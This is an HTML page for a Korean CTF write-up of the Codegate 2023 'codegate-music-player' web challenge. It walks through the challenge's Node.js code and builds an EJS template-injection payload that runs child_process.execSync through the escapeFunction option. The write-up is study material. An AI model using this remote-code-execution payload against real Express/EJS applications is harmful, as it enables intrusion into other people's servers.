@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="사실 대회중에는 Web문제를 하나도 풀지 못했는데 어제 대회가 끝나고 공부하는 차원에서 Write-up을 작성한다. codegate-music-player123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354version: &amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Codegate 2023 QUALS">
+<meta property="og:url" content="https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/index.html">
+<meta property="og:site_name" content="ursobad">
+<meta property="og:description" content="사실 대회중에는 Web문제를 하나도 풀지 못했는데 어제 대회가 끝나고 공부하는 차원에서 Write-up을 작성한다. codegate-music-player123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354version: &amp;#x27;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github-production-user-asset-6210df.s3.amazonaws.com/66944342/247087195-0b87d325-f4e0-43fd-ba13-385e5a5e8aea.png">
+<meta property="og:image" content="https://github-production-user-asset-6210df.s3.amazonaws.com/66944342/247087002-0412e362-ad3d-4742-bb1e-8280483a93fa.png">
+<meta property="article:published_time" content="2023-06-19T01:41:58.000Z">
+<meta property="article:modified_time" content="2023-07-02T11:35:56.929Z">
+<meta property="article:author" content="ursobad">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github-production-user-asset-6210df.s3.amazonaws.com/66944342/247087195-0b87d325-f4e0-43fd-ba13-385e5a5e8aea.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Codegate 2023 QUALS</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/07/02/Google-CTF-2023/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/12/CCE-2023-QUALS-Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&text=Codegate 2023 QUALS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&is_video=false&description=Codegate 2023 QUALS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Codegate 2023 QUALS&body=Check out this article: https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&title=Codegate 2023 QUALS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&name=Codegate 2023 QUALS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://alicelacie.github.io/2023/06/19/Codegate-2023-QUALS/&t=Codegate 2023 QUALS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#codegate-music-player"><span class="toc-number">1.</span> <span class="toc-text">codegate-music-player</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Calculator"><span class="toc-number">2.</span> <span class="toc-text">Calculator</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Codegate 2023 QUALS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ursobad</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-19T01:41:58.000Z" class="dt-published" itemprop="datePublished">2023-06-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/upsolving/">upsolving</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Web/" rel="tag">Web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>사실 대회중에는 Web문제를 하나도 풀지 못했는데 어제 대회가 끝나고 공부하는 차원에서 Write-up을 작성한다.</p>
+<h3 id="codegate-music-player"><a href="#codegate-music-player" class="headerlink" title="codegate-music-player"></a>codegate-music-player</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">    image: nginx:latest</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">80</span>:<span class="number">80</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./nginx.conf:/etc/nginx/nginx.conf:ro</span><br><span class="line">    links:</span><br><span class="line">      - server</span><br><span class="line"></span><br><span class="line">  frontend:</span><br><span class="line">    build: ./frontend</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - API_FETCH=/api/list</span><br><span class="line">    depends_on:</span><br><span class="line">      - nginx</span><br><span class="line">      - server</span><br><span class="line"></span><br><span class="line">  server:</span><br><span class="line">    build: ./server</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - API_URL=https://fe.gy/copyright-free-content/</span><br><span class="line">      - SECRET=CHEESE_SECRET</span><br><span class="line">      - FLAG=codegate2023&#123;exmaple_flag&#125;</span><br><span class="line">      - REDIS_URL_CACHE=redis://redis:<span class="number">6379</span>/<span class="number">0</span></span><br><span class="line">      - REDIS_URL_QUERY=redis://redis:<span class="number">6379</span>/<span class="number">1</span></span><br><span class="line">      - STATIC_HOST=/api/</span><br><span class="line">      - DIFFICULTY=<span class="number">6</span></span><br><span class="line">      - APP_HOST=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">      - APP_PORT=<span class="number">5000</span></span><br><span class="line">    links:</span><br><span class="line">      - redis</span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    image: redis:<span class="number">5</span></span><br><span class="line">    command: <span class="string">&quot;redis-server /redis.conf&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./redis/redis.conf:/redis.conf</span><br><span class="line">    restart: always</span><br><span class="line">    mem_limit: <span class="number">512</span>M</span><br><span class="line"></span><br><span class="line">  worker:</span><br><span class="line">    build: ./worker</span><br><span class="line">    platform: linux/amd64</span><br><span class="line">    environment:</span><br><span class="line">      - SECRET=CHEESE_SECRET</span><br><span class="line">    links:</span><br><span class="line">      - nginx</span><br><span class="line">      - redis</span><br><span class="line">    restart: always</span><br></pre></td></tr></table></figure>
+
+<p>도커 파일을 보면 frontend, nginx, server, redis, worker로 이루어진 것을 알 수 있다. server는 nodejs를 사용한 <code>/api</code> endpoint에 연결되고 frontend는 <code>/</code>에 연결된다. worker는 브라우저에 SECRET쿠키를 설정하고 이를 랜더링하는 봇 역할을 해준다.</p>
+<p>server의 코드를 살펴보면 특정 조건 없이 접근할 수 있는 endpoint는 아래와 같다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fetch streaming</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/list&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, contentList)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// run streaming</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/stream/:url&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> url = req.<span class="property">params</span>.<span class="property">url</span></span><br><span class="line">        <span class="keyword">const</span> domain = <span class="keyword">new</span> <span class="title function_">URL</span>(url).<span class="property">hostname</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// prevent memory overload</span></span><br><span class="line">        redisCache.<span class="title function_">dbsize</span>(<span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(result &gt;= <span class="number">256</span>)&#123;</span><br><span class="line">                redisCache.<span class="title function_">flushdb</span>()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// preventing DNS attacks, etc.</span></span><br><span class="line">        <span class="title function_">getIPAddress</span>(domain)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">ipAddress</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(!url.<span class="title function_">startsWith</span>(<span class="string">&quot;http://&quot;</span>) &amp;&amp; !url.<span class="title function_">startsWith</span>(<span class="string">&quot;https://&quot;</span>))&#123;</span><br><span class="line">                    url = <span class="variable constant_">STATIC_HOST</span>.<span class="title function_">concat</span>(url).<span class="title function_">replace</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="string">&quot;%2e%2e&quot;</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="string">&quot;%2e.&quot;</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="string">&quot;.%2e&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_">isInternalIP</span>(ipAddress)) <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;No Hack!&quot;</span>, <span class="number">500</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// redis || axios</span></span><br><span class="line">                redisCache.<span class="title function_">get</span>(url.<span class="title function_">split</span>(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>], <span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err || !result)&#123;</span><br><span class="line">                        axios</span><br><span class="line">                            .<span class="title function_">get</span>(url, &#123; <span class="attr">responseType</span>: <span class="string">&quot;arraybuffer&quot;</span>, <span class="attr">timeout</span>: <span class="number">3000</span> &#125;)</span><br><span class="line">                            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!allowedContentTypes.<span class="title function_">includes</span>(response.<span class="property">headers</span>[<span class="string">&quot;content-type&quot;</span>]))&#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;Not a valid music file&quot;</span>, <span class="number">500</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (response.<span class="property">data</span>.<span class="property">byteLength</span> &gt;= <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">3</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;Music file is too big&quot;</span>, <span class="number">500</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                redisCache.<span class="title function_">set</span>(url, response.<span class="property">data</span>.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(url)</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, response.<span class="property">data</span>)</span><br><span class="line">                            &#125;)</span><br><span class="line">                            .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;No Hack!&quot;</span>, <span class="number">500</span>)</span><br><span class="line">                            &#125;)</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result, <span class="string">&quot;hex&quot;</span>))</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;No Hack!&quot;</span>, <span class="number">500</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;Failed Streaming!&quot;</span>, <span class="number">500</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// inquiry</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/inquiry&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">lastValue</span> || !req.<span class="property">session</span>.<span class="property">lastLength</span>)&#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">lastLength</span> = <span class="variable constant_">DIFFICULTY</span></span><br><span class="line">        req.<span class="property">session</span>.<span class="property">lastValue</span> = <span class="title function_">generateRandomString</span>(<span class="variable constant_">DIFFICULTY</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">`<span class="subst">$&#123;req.session.lastLength&#125;</span>/<span class="subst">$&#123;req.session.lastValue&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">query</span>.<span class="property">url</span> || <span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">url</span> !== <span class="string">&quot;string&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;No Hack!&quot;</span>, <span class="number">500</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">query</span>.<span class="property">checksum</span> || <span class="title function_">getLastCharacterMD5</span>((req.<span class="property">query</span>.<span class="property">checksum</span> || <span class="string">&#x27;&#x27;</span>), <span class="variable constant_">DIFFICULTY</span>) !== req.<span class="property">session</span>.<span class="property">lastValue</span>)&#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">lastLength</span> = <span class="variable constant_">DIFFICULTY</span></span><br><span class="line">        req.<span class="property">session</span>.<span class="property">lastValue</span> = <span class="title function_">generateRandomString</span>(<span class="variable constant_">DIFFICULTY</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">`<span class="subst">$&#123;req.session.lastLength&#125;</span>/<span class="subst">$&#123;req.session.lastValue&#125;</span>`</span>, <span class="number">500</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    redisQuery.<span class="title function_">rpush</span>(<span class="string">&quot;query&quot;</span>, req.<span class="property">query</span>.<span class="property">url</span>)</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">lastLength</span> = <span class="variable constant_">DIFFICULTY</span></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">lastValue</span> = <span class="title function_">generateRandomString</span>(<span class="variable constant_">DIFFICULTY</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;Complete&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>그리고 아래는 특정 조건을 성립시켜야 하는 endpoint이다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inquiry</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/messages&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>[<span class="string">&quot;SECRET&quot;</span>] || req.<span class="property">cookies</span>[<span class="string">&quot;SECRET&quot;</span>] !== <span class="variable constant_">SECRET</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;Nope&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;admin&quot;</span>, &#123;...id&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// get flag</span></span><br><span class="line">app.<span class="title function_">patch</span>(<span class="string">&quot;/api/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; flag &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>[<span class="string">&quot;SECRET&quot;</span>] || req.<span class="property">cookies</span>[<span class="variable constant_">SECRET</span>] !== <span class="variable constant_">FLAG</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">sendResponse</span>(res, <span class="string">&quot;Nope&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;flag&quot;</span>, flag)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;api&#x2F;message에서 조건을 만족하면 res.render에 id가 직점 전달되는 것을 볼 수 있다. 이는 원래라면 SSTI에 꽤 취약한 코드패턴이다. 하지만 package.json을 확인하면 <code>&quot;ejs&quot;: &quot;^3.1.9&quot;,</code>를 사용하여 SSTI가 안터질줄 알았는데 최근 이슈를 보니까 SSTI가 발생한 사례와 유사한 writeup를 찾을 수 있었다.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mde/ejs/issues/735">https://github.com/mde/ejs/issues/735</a><br><a target="_blank" rel="noopener" href="https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/express-javascript-security">https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/express-javascript-security</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3000/?name=John&amp;settings[view options][client]=true&amp;settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>이를 id에 넣을 수 있는 json구조로 바꿔보면 아래와 같다.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;view options&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span>      </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>pocess.enc.NODE_ENV으로 production이기 때문에 cache가 활성화되서 settings에서 cache 옵션을 꺼줘야 한다.</p>
+<p>최종적인 json payload는 아래와 같아진다.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;view options&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cache&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
